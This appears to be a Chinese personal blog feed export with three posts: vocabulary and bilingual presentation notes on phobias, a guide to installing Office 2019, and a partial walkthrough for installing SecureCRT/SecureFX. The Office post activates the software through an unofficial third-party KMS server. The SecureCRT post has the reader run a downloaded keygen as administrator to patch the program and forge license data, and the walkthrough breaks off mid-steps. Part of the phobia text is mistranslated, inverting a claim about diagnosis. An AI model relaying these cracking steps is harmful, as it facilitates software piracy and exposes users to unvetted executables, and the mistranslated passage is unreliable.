<p><strong>categorizes</strong><br>英 [ˈkætəɡəraɪzɪz]   美 [ˈkætəɡəraɪzɪz]<br>v.<br>将…分类;把…加以归类<br>categorize的第三人称单数</p>
<p><strong>Agoraphobia</strong><br>英 [ˌæɡərəˈfəʊbiə]   美 [ˌæɡərəˈfoʊbiə]<br>广场恐怖症;广场恐惧症;场所恐惧症;惧旷症;广场恐怖</p>
<p><strong>inescapable</strong><br>英 [ˌɪnɪˈskeɪpəbl]   美 [ˌɪnɪˈskeɪpəbl]<br>adj.<br>不可避免的;逃避不了的;不能忽视的<br>派生词： inescapably adv.</p>
<p><strong>phobic</strong><br>英 [ˈfəʊbɪk]   美 [ˈfoʊbɪk]<br>n.<br>恐惧症患者;极端仇视者;恐惧…的;仇恨…的<br>adj.<br>病态性恐惧的</p>
<p><strong>pervasive</strong><br>英 [pəˈveɪsɪv]   美 [pərˈveɪsɪv]<br>adj.<br>遍布的;充斥各处的;弥漫的<br>派生词： pervasively adv. pervasiveness n.</p>
<p><strong>overwhelming</strong><br>英 [ˌəʊvəˈwelmɪŋ]   美 [ˌoʊvərˈwelmɪŋ]<br>adj.<br>巨大的;压倒性的;无法抗拒的<br>v.<br>(感情或感觉)充溢，难以禁受;压倒;击败;征服;压垮;使应接不暇<br>overwhelm的现在分词</p>
<p><strong>rodents</strong><br>英 [ˈrəʊdənts]   美 [ˈroʊdənts]<br>n.<br>啮齿动物<br>rodent的复数</p>
<p><strong>tornadoes</strong><br>英 [tɔːˈneɪdəʊz]   美 [tɔrˈneɪdoʊz]<br>n.<br>龙卷风;旋风<br>tornado的复数</p>
<p><strong>mudslides</strong><br>英 [ˈmʌdslaɪdz]   美 [ˈmʌdslaɪdz]<br>n.<br>泥流<br>mudslide的复数</p>
<p><strong>Arachnophobia</strong><br>英 [əˌræknəˈfəʊbiə]   美 [əˌræknəˈfoʊbiə]<br>小魔煞;蜘蛛恐惧症;小魔星;蜘蛛克星;蜘蛛恐怖症</p>
<p><strong>Claustrophobia</strong><br>英 [ˌklɔːstrəˈfəʊbiə]   美 [ˌklɔːstrəˈfoʊbiə]<br>幽闭恐惧症;幽闭恐怖症;亲密;幽闭恐惧;幽閉恐懼症</p>
<p><strong>instances</strong><br>英 [ˈɪnstənsɪz]   美 [ˈɪnstənsɪz]<br>n.<br>例子;事例;实例<br>v.<br>举…为例<br>instance的第三人称单数和复数</p>
<p><strong>strategically</strong><br>英 [strəˈtiːdʒɪkəli]   美 [strəˈtidʒɪkli]<br>adv.<br>战略上</p>
<p><strong>relaxation</strong><br>英 [ˌriːlækˈseɪʃn]   美 [ˌriːlækˈseɪʃn]<br>n.<br>放松;休息;消遣;用于放松消遣的时间;休闲活动;娱乐活动;(对规章制度的)放宽</p>
<p><strong>techniques</strong><br>英 [tɛkˈniːks]   美 [tɛkˈniks]<br>n.<br>技巧;技艺;工艺;技术;技能<br>technique的复数</p>
<p><strong>incompatible</strong><br>英 [ˌɪnkəmˈpætəbl]   美 [ˌɪnkəmˈpætəbl]<br>adj.<br>(与某事物)不一致，不相配;(与某人)合不来，不能和睦相处;(与某物)不匹配;配伍禁忌的;不兼容;互斥的<br>派生词： incompatibility n.</p>
<p><strong>diminishes</strong><br>英 [dɪˈmɪnɪʃɪz]   美 [dɪˈmɪnɪʃɪz]<br>v.<br>减少;(使)减弱，缩减;降低;贬低;贬损;轻视<br>diminish的第三人称单数</p>
<p><strong>adolescents</strong><br>英 [ˌædəʊˈlɛsnts]   美 [ˌædəˈlɛsənts]<br>n.<br>青少年<br>adolescent的复数</p>
<p><strong>potentially</strong><br>英 [pə’tenʃəli]   美 [pə’tenʃəli]<br>adv.<br>潜在地</p>
<p><strong>antidepressant</strong><br>英 [ˌæntidɪˈpresnt]   美 [ˌæntidɪˈpresnt]<br>n.<br>抗抑郁药<br>adj.<br>抗抑郁的<br>派生词： antidepressant adj.</p>
<p><strong>cognitive</strong><br>英 [ˈkɒɡnətɪv]   美 [ˈkɑːɡnətɪv]<br>adj.<br>认知的;感知的;认识的</p>
<p><strong>therapy</strong><br>英 [ˈθerəpi]   美 [ˈθerəpi]<br>n.<br>治疗;疗法</p>
<p><strong>licensed</strong><br>英 [ˈlaɪsnst]   美 [ˈlaɪsnst]<br>adj.<br>有售酒许可的;获准售酒的;获准拥有的;得到正式许可的<br>v.<br>批准;许可<br>license的过去分词和过去式</p>
<p><strong>therapist</strong><br>英 [ˈθerəpɪst]   美 [ˈθerəpɪst]<br>n.<br>(某治疗法的)治疗专家</p>
<p><strong>psychiatrist</strong><br>英 [saɪˈkaɪətrɪst]   美 [saɪˈkaɪətrɪst]<br>n.<br>精神病学家;精神科医生</p>
<p><strong>psychology</strong><br>英 [saɪˈkɒlədʒi]   美 [saɪˈkɑːlədʒi]<br>n.<br>心理学;心理;心理特征;心理影响</p>
<p><strong>psychological</strong><br>英 [ˌsaɪkəˈlɒdʒɪkl]   美 [ˌsaɪkəˈlɑːdʒɪkl]<br>adj.<br>心灵的;心理的;精神上的;心理学的;关于心理学的</p>
<p><strong>psychologist</strong><br>英 [saɪˈkɒlədʒɪst]   美 [saɪˈkɑːlədʒɪst]<br>n.<br>心理学家;心理学研究者</p>
<p><strong>intense</strong><br>英 [ɪnˈtens]   美 [ɪnˈtens]<br>adj.<br>很大的;十分强烈的;严肃紧张的;激烈的;有强烈感情(或意见、想法)的;尖锐的;热切的</p>
<p><strong>manifests</strong><br>英 [ˈmænɪfests]   美 [ˈmænɪfests]<br>v.<br>表明，清楚显示(尤指情感、态度或品质);显现;使人注意到<br>manifest的第三人称单数</p>
<p><strong>Agoraphobia</strong><br>英 [ˌæɡərəˈfəʊbiə]   美 [ˌæɡərəˈfoʊbiə]<br>广场恐怖症;广场恐惧症;场所恐惧症;惧旷症;广场恐怖</p>
<p><strong>incorporates</strong><br>英 [ɪnˈkɔːpəreɪts]   美 [ɪnˈkɔːrpəreɪts]<br>v.<br>将…包括在内;包含;吸收;使并入;注册成立<br>incorporate的第三人称单数</p>
<p><strong>triggers</strong><br>英 [ˈtrɪɡəz]   美 [ˈtrɪɡərz]<br>n.<br>(枪的)扳机;(尤指引发不良反应或发展的)起因，诱因;触发器;引爆器<br>v.<br>发动;引起;触发;开动;起动<br>trigger的第三人称单数和复数</p>
<p><strong>composite</strong><br>英 [ˈkɒmpəzɪt]   美 [kəmˈpɑːzət]<br>adj.<br>合成的;混成的;复合的<br>n.<br>合成物;混合物;复合材料</p>
<p><strong>stimuli</strong><br>英 [ˈstɪmjʊlaɪ]   美 [ˈstɪmjəˌlaɪ]<br>n.<br>促进因素;激励因素;刺激物;(使生物产生反应的)刺激<br>stimulus的复数</p>
<p><strong>ultimately</strong><br>英 [ˈʌltɪmətli]   美 [ˈʌltɪmətli]<br>adv.<br>最终;最后;终归;最基本地;根本上</p>
<p><strong>Hydrophobia</strong><br>英 [ˌhaɪdrəˈfəʊbiə]   美 [ˌhaɪdrəˈfoʊbiə]<br>恐水症;恐水病;狂犬病;又称恐水病;泼水</p>
<p><strong>traumatic</strong><br>英 [trɔːˈmætɪk]   美 [traʊˈmætɪk]<br>adj.<br>痛苦的;极不愉快的;创伤的;外伤的;损伤的<br>派生词： traumatically adv.</p>
<p><strong>symptoms</strong><br>英 [ˈsɪmptəmz]   美 [ˈsɪmptəmz]<br>n.<br>症状;征候;征兆<br>symptom的复数</p>
<p><strong>diagnosed</strong><br>英 [ˈdaɪəɡnəʊzd]   美 [ˌdaɪəɡˈnoʊst]<br>v.<br>诊断(疾病);判断(问题的原因)<br>diagnose的过去分词和过去式</p>
<h1 id="PPT"><a href="#PPT" class="headerlink" title="PPT"></a>PPT</h1><ol>
<li>What a phobia is?</li>
<li><del>The  classification of phobia.</del></li>
<li><del>The causes of phobias?</del></li>
<li>Phobia Symptoms.</li>
<li>Types of Phobias.</li>
<li>Phobia Treatments.</li>
</ol>
<h5 id="What-a-phobia-is"><a href="#What-a-phobia-is" class="headerlink" title="What a phobia is?"></a>What a phobia is?</h5><p>A phobia is an intense fear of a particular situation or object that is generally unreasonable in nature and which often has a direct impact on a person’s life. As a psychological consideration,the impact this fear has on the life of a person is typically a major factor in determining if a particular fear is mild and common or severe enough to constitute a form of mental illness. A phobia is typically considered to be a specific aspect of anxiety disorder,as the reaction caused when confronted with the object or source of fear is similar to anxiety.</p>
<p>恐惧症是指对自然界中某一个场景或者物体有一种强烈的恐惧，这种恐惧直接影响人们的生活。从心理学来讲，这种恐惧对人们生活的影响决定了这种特别的恐惧是温和普遍的还是足够严重能够导致精神疾病。恐惧症主要被认为是焦虑症的具体影响，恐惧症面对物体或恐惧来源时产生的反应和焦虑症是相似的。</p>
<p>The key components of a phobia are typically the fact that it is unreasonable and that it has a direct impact on a person’s quality of life.Someone who feels fear and panic when confronted by a person holding a weapon in a threatening way is not experiencing a phobia.This response of anxiety is perfectly reasonable,since the person is encountering a situation that may result in bodily harm or death. Someone experiencing a similar level of anxiety, perhaps accompanied by quickened breathing and heartbeat and a general sense of panic, when confronted by a common spider is experiencing a phobia, as this reaction is fairly unreasonable.</p>
<p>恐惧症的关键部分通常是恐惧的产生是不合理的没有原因的而且恐惧还必须对人们的生活质量有直接影响。因为被人用武器威胁的方式感到恐惧和恐慌这不是在经历恐惧症。焦虑的产生必须是完全无理由的，不能是因为遭遇可能会导致身体受伤或死亡的状况所产生的恐惧。经历相同水平的焦虑可能会伴随着呼吸加快心跳、呼吸加快和恐慌，一只普通的蜘蛛所带来的焦虑是恐惧症，因为这个反应相当没有理由。</p>
<p>A phobia also has a direct and negative impact on a person’s life and ability to function.If someone suffers a server fear of the word “heliotrope”,this would likely not be diagnosed as a mental illness since it is unlikely that this fear would directly impact that person’s well-being.An intense fear of water, on the other hand,may be grounds for a diagnosis, as this can impact a person’s ability to bathe, go outside during a rainstorm, and even enjoy a glass of water.</p>
<p>恐惧症对人们的生活和个人能力也有直接和消极的影响。如果某个人对单词“heliotrope”有严重的恐惧，这很可能会被诊断为精神疾病因为这个恐惧不可能直接影响人的幸福。在另一方面，对水的强烈恐惧可能是诊断依据，因为这可以影响一个人洗澡，雨天外出，甚至还有喝水。</p>
<h5 id="The-classification-of-phobia"><a href="#The-classification-of-phobia" class="headerlink" title="The  classification of phobia."></a>The  classification of phobia.</h5><p>There are generally three basic types of fears that are the grounds for a number of different types of fears. <strong>Social phobia</strong> is an intense fear of social situations and other people. It usually manifests in either generalized or specific forms. The generalized form is a basic fear of social situations and meeting new people, while specific forms often indicate one particular aspect of social interaction that triggers the panic response.</p>
<p>通常有三种基本的恐惧，其他大量不同类型的恐惧都以这三种为基础。社交恐惧症是一个对社会的状况和其他人的强烈的恐惧。它通常表现为一般形式或具体形式。一般形式是对社交场景和与陌生人见面的基本恐惧，而具体形式经常指某一个特定的触发恐慌的社会活动。</p>
<p><strong>Agoraphobia</strong> is a basic type of fear that incorporates a number of different triggers that cause anxiety and panic. These different triggers create a composite fear of leaving the home or going outside.This can include certain aspects of social phobia and fear responses to other stimuli,but ultimately results in a person’s inability to leave his or her home or other place he or she feels safe.</p>
<p>广场恐惧症是一种基础的恐惧，它包含了大量的不同的可能导致焦虑和恐慌的因素。这些不同的因素产生了离开家或外出时的混合恐惧。这可能包括社交恐惧症的部分方面以及对其他刺激的恐惧反应，最终导致一个人无法离开家或他/她感到安全的地方。</p>
<p>There are also <strong>specific phobias</strong> that all refer to individual fears of different things. <strong>Hydrophobia</strong>,for example,is a fear of water, ofter tied to a traumatic experience such as nearly drowning as a child, while <strong>arachnophobia</strong> is an intense fear of spiders. There different phobias can affect people in different ways, but are generally tied to a particular stimulus that triggers the panic or fear response.</p>
<p>也有一些特定恐惧症，是对不同事物的个人恐惧。例如，恐水症就是对水的恐惧，这和创伤性的经历比如小时候溺过水有关，蜘蛛恐惧症是一种对蜘蛛的强烈恐惧。这些不同的恐惧通过不同的方式影响着人么，但是它们通常依赖于某些触发恐慌或恐惧反应的特定刺激。</p>
<h5 id="The-causes-of-phobias"><a href="#The-causes-of-phobias" class="headerlink" title="The causes of phobias?"></a>The causes of phobias?</h5><h5 id="What-is-phobia"><a href="#What-is-phobia" class="headerlink" title="What is phobia?"></a>What is phobia?</h5><p>A phobia is an irrational fear,a kind of anxiety disorder in which the sufferer has a rentless dread of a situation,living creature,place or thing.</p>
<p>phobias are the most common kind of anxiety disorder in the industrial nations:</p>
<ul>
<li>Over 50 million people in the USA and 10 million in the UK are thought to live with a phobia.</li>
<li>Between 8.7% and 18.1% of Americans of all ages suffer from phobias.</li>
</ul>
<h5 id="Phobia-Symptoms"><a href="#Phobia-Symptoms" class="headerlink" title="Phobia Symptoms."></a>Phobia Symptoms.</h5><p><a href="https://adaa.org/understanding-anxiety/specific-phobias/symptoms">Phobic symptoms</a> can occur through exposure to the feared object or situation, or sometimes merely through thinking about the feared object. Typical symptoms associated with phobias include:</p>
<ul>
<li>Breathlessness</li>
<li>Dizziness, trembling, and increased heart rate</li>
<li>Fear of dying</li>
<li>Nausea</li>
<li>Preoccupation with the feared object</li>
<li>A sense of unreality</li>
</ul>
<p>In some cases, these symptoms may escalate into a full-scale <a href="https://www.verywellmind.com/what-is-an-anxiety-attack-2584253">anxiety attack</a>.</p>
<p>In response to these symptoms, some individuals may develop social anxiety disorder (SAD)—previously known as social phobia—and begin to isolate themselves, leading to severe difficulties with functioning in daily life and with maintaining relationships.</p>
<p>In other cases, <a href="https://www.verywellmind.com/hypochondriasis-2671689">such as with hypochondriasis</a>, a person may seek out medical care due to a constant concern with imagined illnesses or imminent death.</p>
<h5 id="Types-of-Phobias"><a href="#Types-of-Phobias" class="headerlink" title="Types of Phobias."></a>Types of Phobias.</h5><p>The <a href="https://www.psychiatry.org/patients-families/anxiety-disorders/what-are-anxiety-disorders">American Psychiatric Association defines phobias as anxiety disorders</a> and categorizes them into three different types:</p>
<ul>
<li><a href="https://www.verywellmind.com/agoraphobia-101-2584235"><strong>Agoraphobia</strong></a>: This describes a fear of being trapped in an inescapable place or situation. As a result, the phobic individual may begin to avoid such situations. In some cases, this fear can become so pervasive and overwhelming that the individual even fears to leave their home.</li>
<li><strong>Specific phobias</strong>: These involve the fear of a particular object (such as snakes or <a href="https://www.verywellmind.com/what-is-the-fear-of-butterflies-and-moths-2671884">butterflies and moths</a>). Such phobias typically fall into one of four different categories: situational, animals, medical, or environmental. A few examples of <a href="https://www.verywellmind.com/most-common-phobias-4136563">common fear objects </a>include spiders, dogs, needles, natural disasters, heights, and flying.</li>
<li><strong>Social phobias</strong>: A fear of social situations includes an extreme and pervasive fear of social situations. In some cases, this fear may center on a very particular type of social situation such as public speaking. In other instances, people may fear to perform any task in front of other people for fear that they will be somehow publicly embarrassed.</li>
</ul>
<p>More examples of the four major types of specific phobias﻿ include:</p>
<ul>
<li><strong>Animal</strong>: Fear of snakes, rodents, cats, or birds.</li>
<li><strong>Medical</strong>: Fear of seeing blood or visiting a doctor.</li>
<li><strong>Natural environment</strong>: Fear of lightning, water, storms, hurricanes, tornadoes, or mudslides.</li>
<li><strong>Situational</strong>: Fear of bridges, leaving home, or driving.</li>
</ul>
<h5 id="Prevalence-of-Social-Anxiety-Disorder"><a href="#Prevalence-of-Social-Anxiety-Disorder" class="headerlink" title="Prevalence of Social Anxiety Disorder"></a>Prevalence of Social Anxiety Disorder</h5><p>According to the National Institute of Mental Health, social anxiety disorder <a href="https://www.nimh.nih.gov/health/publications/social-anxiety-disorder-more-than-just-shyness/index.shtml">affects about 7% of adult Americans in a given year</a> and specific phobias <a href="https://www.nimh.nih.gov/health/statistics/specific-phobia.shtml">affect approximately 9%</a>. In general, women are affected more than men.</p>
<p>According to the <a href="https://www.verywellmind.com/the-diagnostic-and-statistical-manual-dsm-2795758"><em>Diagnostic and Statistical Manual of Mental Disorders</em></a>, only about 10% of reported phobia cases become life-long phobias.</p>
<h5 id="Phobia-Treatments"><a href="#Phobia-Treatments" class="headerlink" title="Phobia Treatments."></a>Phobia Treatments.</h5><p>There are <a href="https://www.verywellmind.com/treatment-options-for-phobias-2672022">a number of treatment approaches for phobias</a>, and the effectiveness of each approach depends on the person and their type of phobia. </p>
<p>In exposure treatments,the person is strategically exposed to their feared object in order to help them overcome their fear. One type of exposure treatment is flooding, in which the patient is confronted by the feared object for an extended length of time without the opportunity to escape. The goal of this method is to help the individual face their fear and realize that the feared object will not harm them.</p>
<p>Another method often used in phobia treatment is counter-conditioning. In this method, the person is taught a new response to the feared object. Rather than panic in the face of the feared object or situation, the person learns <a href="https://www.verywellmind.com/relaxation-techniques-for-sad-3024334">relaxation techniques</a> to replace anxiety and fear.</p>
<p>This new behavior is incompatible with the previous panic response, so the phobic response gradually diminishes. Counter-conditioning is often used with people who are unable to handle exposure treatments and has been effective for treating children and adolescents.</p>
<p>Finally, for both adults and children with social phobia, medication like a low dose of a <a href="https://www.verywellmind.com/the-benzodiazepines-378909">benzodiazepine</a> or potentially an antidepressant (like a selective serotonin reuptake inhibitor, or SSRI) in combination with cognitive-behavioral therapy can prove helpful.</p>
<h5 id="A-Word-From-Verywell"><a href="#A-Word-From-Verywell" class="headerlink" title="A Word From Verywell"></a>A Word From Verywell</h5><p>If you think you may have a phobia, please seek out treatment from a licensed therapist, psychologist, or psychiatrist. You deserve to develop control of this fear, and you can with proper therapy. </p>
<p>Good morning ,my name is zww.Today,the topic I’m going to talk about is high anxiety:phobias.I will introduce it from the following four aspects.</p>
<p>p5:Ok,let’s go on.</p>
<p>OK，that’s all,thanks for your listening.</p>
<p><a href="/video/Phobia">ppt插入视频</a></p>
<h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><p><a href="https://www.zhizuotu.com/buttonColor">去底色</a></p>
<p><a href="https://bigjpg.com/">AI人工智能图片放大</a></p>
<p><a href="https://www.gaitubao.com/">改图宝修改图片尺寸</a></p>
<p><a href>恐惧症举例（动图）</a></p>
<p><a href="https://www.youtube.com/watch?v=jYA9CHX1NLU&amp;feature=youtu.be">插入视频</a>（科学上网）</p>
<p><a href="https://en.savefrom.net/18/">youtube视频下载</a></p>
<p><a href="https://wenku.baidu.com/view/a77d9c81cec789eb172ded630b1c59eef9c79a79">high anxiety:phobia ppt百度文库付费</a></p>
<p><a href="https://www.nhs.uk/conditions/phobias/treatment/">treatment视频</a></p>
]]></content>
      <categories>
        <category>课程</category>
      </categories>
  </entry>
  <entry>
    <title>Office 专业增强版2019-批量版下载安装</title>
    <url>/2020/11/19/Office-%E4%B8%93%E4%B8%9A%E5%A2%9E%E5%BC%BA%E7%89%882019-%E6%89%B9%E9%87%8F%E7%89%88%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Office Tool Plus 是一个用于部署 Office, Visio 和 Project 的工具，支持 Office 2016、2019 和 365。借助 Office Tool Plus，你能很方便地部署 Office。</p>
<p>Office Tool Plus 基于微软的 <a href="https://docs.microsoft.com/en-us/DeployOffice/overview-of-the-office-2016-deployment-tool">Office 部署工具</a>和 <a href="https://docs.microsoft.com/en-us/DeployOffice/vlactivation/tools-to-manage-volume-activation-of-office">OSPP</a> 打造。</p>
<p><a href="https://otp.landian.vip/">Office Tool Plus 官方网站</a></p>
<p><a href="https://otp.landian.vip/download.html">Office Tool Plus 下载站</a></p>
<a id="more"></a>
<h6 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h6><p>Office Tool Plus 下载安装包可以在官网下载，也可以用我分享的安装程序</p>
<p>百度网盘下载链接：</p>
<p>链接：<a href="https://pan.baidu.com/s/102-U0p-sOW16TY-XtGyC_w">https://pan.baidu.com/s/102-U0p-sOW16TY-XtGyC_w</a><br>提取码：p1oc </p>
<h6 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h6><p>解压安装包，运行程序</p>
<p><img src="/2020/11/19/Office-%E4%B8%93%E4%B8%9A%E5%A2%9E%E5%BC%BA%E7%89%882019-%E6%89%B9%E9%87%8F%E7%89%88%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85/image-20201119222701548.png" alt="image-20201119222701548"></p>
<p>选择部署（注意需要联网）</p>
<p><img src="/2020/11/19/Office-%E4%B8%93%E4%B8%9A%E5%A2%9E%E5%BC%BA%E7%89%882019-%E6%89%B9%E9%87%8F%E7%89%88%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85/image-20201119222721511.png" alt="image-20201119222721511"></p>
<p>在部署页面勾选要安装的应用程序，在右侧安装设置中选择x64位体系结构，通道选择Office2019企业长期版，然后点击开始部署，然后等待安装完成就好了。</p>
<p><img src="/2020/11/19/Office-%E4%B8%93%E4%B8%9A%E5%A2%9E%E5%BC%BA%E7%89%882019-%E6%89%B9%E9%87%8F%E7%89%88%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85/image-20201119222818764.png" alt="image-20201119222818764"></p>
<h6 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h6><p>在软件安装主页面选择激活选项</p>
<p><img src="/2020/11/19/Office-%E4%B8%93%E4%B8%9A%E5%A2%9E%E5%BC%BA%E7%89%882019-%E6%89%B9%E9%87%8F%E7%89%88%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85/image-20201119223031679.png" alt="image-20201119223031679"></p>
<p>在激活页面配置如下</p>
<p>选择许可证“ProPlus2019Volume”——》安装许可证</p>
<p>密钥管理：NMMKJ-6RK4F-KMJVX-8D9MJ-6MWKP——》安装密钥</p>
<p>KMS管理：kms.03k.org——》应用服务器地址</p>
<p>点击“激活”</p>
<p><img src="/2020/11/19/Office-%E4%B8%93%E4%B8%9A%E5%A2%9E%E5%BC%BA%E7%89%882019-%E6%89%B9%E9%87%8F%E7%89%88%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85/image-20201119223726591.png" alt="image-20201119223726591"></p>
<p>随便到一个office应用程序里面查看，可以看到已经激活成功了</p>
<p><img src="/2020/11/19/Office-%E4%B8%93%E4%B8%9A%E5%A2%9E%E5%BC%BA%E7%89%882019-%E6%89%B9%E9%87%8F%E7%89%88%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85/image-20201119223812597.png" alt="image-20201119223812597"></p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>SecureCRT+SecureFx软件安装破解</title>
    <url>/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>SecureCRT是一款支持SSH(SSH1和SSH2)的终端仿真程序,简单地说是Windows下登录UNIX或Linux服务器主机的软件。</p>
<p>SecureFX是和SecureCRT配套的客户端文件传输程序,废话不多说开始吧，下载链接在文末</p>
<a id="more"></a>
<p>1、首先下载需要的安装程序（链接在文末），第一个是安装程序，后两个是各自的注册机</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621153619976.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>2、双击scrt_sfx81-x64.exe开始安装，选择next</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621153844649.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>选择接受协议-》next</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621153911788.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>第一个选项是对电脑所有用户都好使，第二个为当前用户，直接next就行</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621153949127.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>注意：第一个Complete安装是默认安装位置在C盘，我不喜欢装软件在C盘，这里我们选择Custom-》next</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621154044674.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>点击“change”选择安装目录-》next</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621154255564.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>上面两个选项根据需要选吧-》next</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621154346796.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>选择install开始安装最后finish，</p>
<p>2、解压SecureCRT keygen.zip压缩包，把SecureCRT keygen.exe放到SecureCRT的安装目录，（很重要）我这里是E:\Secure_CRT_FX，然后以管理员方式运行</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621154550481.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>选择patch-》选中SecureCRT安装路径的SecureCRT.exe程序</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621154705969.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>然后弹出成功框-》点击确定-》选择LicenseHelper.exe</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621154836127.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621154855240.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>然后点确定就行了(注意不要关闭这个窗口，后面还要用）</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621154942338.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>然后运行SecureCRT程序-》选择Enter License Data…</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621155040697.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>直接点击下一步</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621155112679.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>选择Enter License Manually</p>
<p><img src="/2020/11/19/SecureCRT-SecureFx%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/20200621155127327.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>然后把刚才注册机的页面信息对应填到这个页面——》下一步</p>
